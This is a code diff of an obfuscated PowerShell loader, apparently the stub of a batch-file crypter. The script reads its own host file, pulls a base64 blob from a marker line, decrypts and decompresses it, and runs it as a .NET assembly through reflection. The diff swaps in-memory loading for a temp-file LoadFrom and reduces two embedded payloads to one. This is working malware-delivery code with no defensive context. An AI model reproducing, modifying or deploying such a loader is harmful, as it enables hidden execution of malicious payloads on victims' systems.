@@ -26,12 +26,14 @@ function decompress_function($param_var)
 
 function execute_function($param_var,$param2_var)
 {
-	$obfstep1_var=[System.Reflection.Assembly]::Load([byte[]]$param_var);
+	$obftmp_var=[System.IO.Path]::GetTempFileName();
+	[System.IO.File]::WriteAllBytes($obftmp_var, [byte[]]$param_var);
+	$obfstep1_var=[System.Reflection.Assembly]::LoadFrom($obftmp_var);
 	$obfstep2_var=$obfstep1_var.EntryPoint;
 	$obfstep2_var.Invoke($null, $param2_var);
 }
 
-$batPath_var = '%~f0';
+$batPath_var = $args[0];
 $host.UI.RawUI.WindowTitle = $batPath_var;
 $contents_var=[System.IO.File]::ReadAllText($batPath_var).Split([Environment]::NewLine);
 foreach ($line_var in $contents_var) 
@@ -42,8 +44,5 @@ foreach ($line_var in $contents_var)
 		break;
 	}
 }
-$payloads_var=[string[]]$lastline_var.Split('\');
-$payload1_var=decompress_function (decrypt_function ([Convert]::FromBase64String($payloads_var[0])));
-$payload2_var=decompress_function (decrypt_function ([Convert]::FromBase64String($payloads_var[1])));
-execute_function $payload1_var $null;
-execute_function $payload2_var (,[string[]] ('%*'));
+$payload_var=decompress_function (decrypt_function ([Convert]::FromBase64String($lastline_var)));
+execute_function $payload_var (,[string[]] ($args[1..($args.Length-1)] -join ' '));
